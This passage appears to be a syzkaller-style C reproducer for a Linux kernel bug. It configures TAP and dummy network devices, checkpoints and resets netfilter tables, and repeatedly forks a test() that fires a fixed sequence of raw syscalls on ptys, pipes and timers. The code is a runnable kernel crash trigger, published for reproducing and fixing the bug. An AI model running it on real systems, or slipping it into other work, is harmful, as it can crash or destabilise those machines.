	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;
	if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {
		ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
		if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)
			fail("tun: ioctl(TUNSETIFF) failed");
	}
	if (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)
		fail("tun: ioctl(TUNGETIFF) failed");
	tun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;

	execute_command(1, "sysctl -w net.ipv6.conf.%s.accept_dad=0", TUN_IFACE);

	execute_command(1, "sysctl -w net.ipv6.conf.%s.router_solicitations=0", TUN_IFACE);

	execute_command(1, "ip link set dev %s address %s", TUN_IFACE, LOCAL_MAC);
	execute_command(1, "ip addr add %s/24 dev %s", LOCAL_IPV4, TUN_IFACE);
	execute_command(1, "ip -6 addr add %s/120 dev %s", LOCAL_IPV6, TUN_IFACE);
	execute_command(1, "ip neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV4, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip -6 neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV6, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip link set dev %s up", TUN_IFACE);
}

#define DEV_IPV4 "172.20.20.%d"
#define DEV_IPV6 "fe80::%02hx"
#define DEV_MAC "aa:aa:aa:aa:aa:%02hx"

static void initialize_netdevices(void)
{
	unsigned i;
	const char* devtypes[] = {"ip6gretap", "bridge", "vcan", "bond", "veth"};
	const char* devnames[] = {"lo", "sit0", "bridge0", "vcan0", "tunl0",
				  "gre0", "gretap0", "ip_vti0", "ip6_vti0",
				  "ip6tnl0", "ip6gre0", "ip6gretap0",
				  "erspan0", "bond0", "veth0", "veth1"};

	for (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)
		execute_command(0, "ip link add dev %s0 type %s", devtypes[i], devtypes[i]);
	execute_command(0, "ip link add dev veth1 type veth");
	for (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {
		char addr[32];
		snprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);
		execute_command(0, "ip -4 addr add %s/24 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);
		execute_command(0, "ip -6 addr add %s/120 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);
		execute_command(0, "ip link set dev %s address %s", devnames[i], addr);
		execute_command(0, "ip link set dev %s up", devnames[i]);
	}
}

static int read_tun(char* data, int size)
{
	if (tunfd < 0)
		return -1;

	int rv = read(tunfd, data, size);
	if (rv < 0) {
		if (errno == EAGAIN)
			return -1;
		if (errno == EBADFD)
			return -1;
		fail("tun: read failed with %d", rv);
	}
	return rv;
}

static void flush_tun()
{
	char data[SYZ_TUN_MAX_PACKET_SIZE];
	while (read_tun(&data[0], sizeof(data)) != -1)
		;
}

static uintptr_t syz_open_pts(uintptr_t a0, uintptr_t a1)
{
	int ptyno = 0;
	if (ioctl(a0, TIOCGPTN, &ptyno))
		return -1;
	char buf[128];
	sprintf(buf, "/dev/pts/%d", ptyno);
	return open(buf, a1, 0);
}

#define XT_TABLE_SIZE 1536
#define XT_MAX_ENTRIES 10

struct xt_counters {
	uint64_t pcnt, bcnt;
};

struct ipt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_entries;
	unsigned int size;
};

struct ipt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct ipt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct ipt_table_desc {
	const char* name;
	struct ipt_getinfo info;
	struct ipt_replace replace;
};

static struct ipt_table_desc ipv4_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

static struct ipt_table_desc ipv6_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

#define IPT_BASE_CTL 64
#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)
#define IPT_SO_GET_INFO (IPT_BASE_CTL)
#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)

struct arpt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_entries;
	unsigned int size;
};

struct arpt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct arpt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct arpt_table_desc {
	const char* name;
	struct arpt_getinfo info;
	struct arpt_replace replace;
};

static struct arpt_table_desc arpt_tables[] = {
    {.name = "filter"},
};

#define ARPT_BASE_CTL 96
#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)
#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)
#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)

static void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct ipt_get_entries entries;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(IPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(IPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct ipt_get_entries entries;
	struct ipt_getinfo info;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(IPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(IPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(IPT_SO_SET_REPLACE)");
	}
	close(fd);
}

static void checkpoint_arptables(void)
{
	struct arpt_get_entries entries;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(ARPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(ARPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_arptables()
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct arpt_get_entries entries;
	struct arpt_getinfo info;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(ARPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(ARPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(ARPT_SO_SET_REPLACE)");
	}
	close(fd);
}
#include <linux/if.h>
#include <linux/netfilter_bridge/ebtables.h>

struct ebt_table_desc {
	const char* name;
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
};

static struct ebt_table_desc ebt_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "broute"},
};

static void checkpoint_ebtables(void)
{
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(EBT_SO_GET_INIT_INFO)");
		}
		if (table->replace.entries_size > sizeof(table->entrytable))
			fail("table size is too large: %u", table->replace.entries_size);
		table->replace.num_counters = 0;
		table->replace.entries = table->entrytable;
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INIT_ENTRIES)");
	}
	close(fd);
}

static void reset_ebtables()
{
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
	socklen_t optlen;
	unsigned i, j, h;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		if (table->replace.valid_hooks == 0)
			continue;
		memset(&replace, 0, sizeof(replace));
		strcpy(replace.name, table->name);
		optlen = sizeof(replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INFO)");
		replace.num_counters = 0;
		for (h = 0; h < NF_BR_NUMHOOKS; h++)
			table->replace.hook_entry[h] = 0;
		if (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {
			memset(&entrytable, 0, sizeof(entrytable));
			replace.entries = entrytable;
			optlen = sizeof(replace) + replace.entries_size;
			if (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))
				fail("getsockopt(EBT_SO_GET_ENTRIES)");
			if (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)
				continue;
		}
		for (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {
			if (table->replace.valid_hooks & (1 << h)) {
				table->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;
				j++;
			}
		}
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))
			fail("setsockopt(EBT_SO_SET_ENTRIES)");
	}
	close(fd);
}

static void checkpoint_net_namespace(void)
{
	checkpoint_ebtables();
	checkpoint_arptables();
	checkpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	checkpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void reset_net_namespace(void)
{
	reset_ebtables();
	reset_arptables();
	reset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	reset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void remove_dir(const char* dir)
{
	DIR* dp;
	struct dirent* ep;
	int iter = 0;
retry:
	dp = opendir(dir);
	if (dp == NULL) {
		if (errno == EMFILE) {
			exitf("opendir(%s) failed due to NOFILE, exiting", dir);
		}
		exitf("opendir(%s) failed", dir);
	}
	while ((ep = readdir(dp))) {
		if (strcmp(ep->d_name, ".") == 0 || strcmp(ep->d_name, "..") == 0)
			continue;
		char filename[FILENAME_MAX];
		snprintf(filename, sizeof(filename), "%s/%s", dir, ep->d_name);
		struct stat st;
		if (lstat(filename, &st))
			exitf("lstat(%s) failed", filename);
		if (S_ISDIR(st.st_mode)) {
			remove_dir(filename);
			continue;
		}
		int i;
		for (i = 0;; i++) {
			if (unlink(filename) == 0)
				break;
			if (errno == EROFS) {
				break;
			}
			if (errno != EBUSY || i > 100)
				exitf("unlink(%s) failed", filename);
			if (umount2(filename, MNT_DETACH))
				exitf("umount(%s) failed", filename);
		}
	}
	closedir(dp);
	int i;
	for (i = 0;; i++) {
		if (rmdir(dir) == 0)
			break;
		if (i < 100) {
			if (errno == EROFS) {
				break;
			}
			if (errno == EBUSY) {
				if (umount2(dir, MNT_DETACH))
					exitf("umount(%s) failed", dir);
				continue;
			}
			if (errno == ENOTEMPTY) {
				if (iter < 100) {
					iter++;
					goto retry;
				}
			}
		}
		exitf("rmdir(%s) failed", dir);
	}
}

static void test();

void loop()
{
	int iter;
	checkpoint_net_namespace();
	for (iter = 0;; iter++) {
		char cwdbuf[256];
		sprintf(cwdbuf, "./%d", iter);
		if (mkdir(cwdbuf, 0777))
			fail("failed to mkdir");
		int pid = fork();
		if (pid < 0)
			fail("loop fork failed");
		if (pid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
			setpgrp();
			if (chdir(cwdbuf))
				fail("failed to chdir");
			flush_tun();
			test();
			doexit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			int res = waitpid(-1, &status, __WALL | WNOHANG);
			if (res == pid)
				break;
			usleep(1000);
			if (current_time_ms() - start > 5 * 1000) {
				kill(-pid, SIGKILL);
				kill(pid, SIGKILL);
				while (waitpid(-1, &status, __WALL) != pid) {
				}
				break;
			}
		}
		remove_dir(cwdbuf);
		reset_net_namespace();
	}
}

uint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};
void test()
{
	long res;memcpy((void*)0x20000280, "/dev/loop-control", 18);
	syscall(__NR_openat, 0xffffffffffffff9c, 0x20000280, 0x4000, 0);
	*(uint64_t*)0x20000180 = 0;
	*(uint64_t*)0x20000188 = 0;
	*(uint64_t*)0x20000190 = 0;
	*(uint64_t*)0x20000198 = 0;
	syscall(__NR_timer_settime, 0, 0, 0x20000180, 0);
	*(uint64_t*)0x20000500 = 0x77359400;
	*(uint64_t*)0x20000508 = 0;
	*(uint64_t*)0x20000510 = 0;
	*(uint64_t*)0x20000518 = 0x989680;
	syscall(__NR_timer_settime, 0, 0, 0x20000500, 0x20000540);
	res = syz_open_pts(-1, 0x42100);
	if (res != -1)
		r[0] = res;
	syscall(__NR_ioctl, r[0], 0x5462, 0x20000140);
	syscall(__NR_ioctl, r[0], 0x80084504, 0x200002c0);
	res = syscall(__NR_pipe2, 0x20000000, 0);
	if (res != -1) {
	r[1] = *(uint32_t*)0x20000000;
	r[2] = *(uint32_t*)0x20000004;
	}
	*(uint16_t*)0x20000040 = -1;
	*(uint16_t*)0x20000042 = 0x200;
	*(uint16_t*)0x20000044 = 0x8000;
	*(uint16_t*)0x20000046 = 0x3f;
	*(uint16_t*)0x20000048 = 0x22;
	*(uint16_t*)0x2000004a = 0x45f;
	syscall(__NR_ioctl, r[1], 0x560a, 0x20000040);
	syscall(__NR_fstatfs, r[1], 0x200000c0);
	syz_open_pts(r[2], 0);
	*(uint32_t*)0x20000340 = 0x10;
	syscall(__NR_accept, r[2], 0x20000300, 0x20000340);
	syscall(__NR_fcntl, r[2], 4, 0x40400);
}

int main()
{
	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
	char *cwd = get_current_dir_name();
	for (;;) {
		if (chdir(cwd))
			fail("failed to chdir");
		use_temporary_dir();
		initialize_tun();
		initialize_netdevices();
		loop();
	}
}
```

**End**

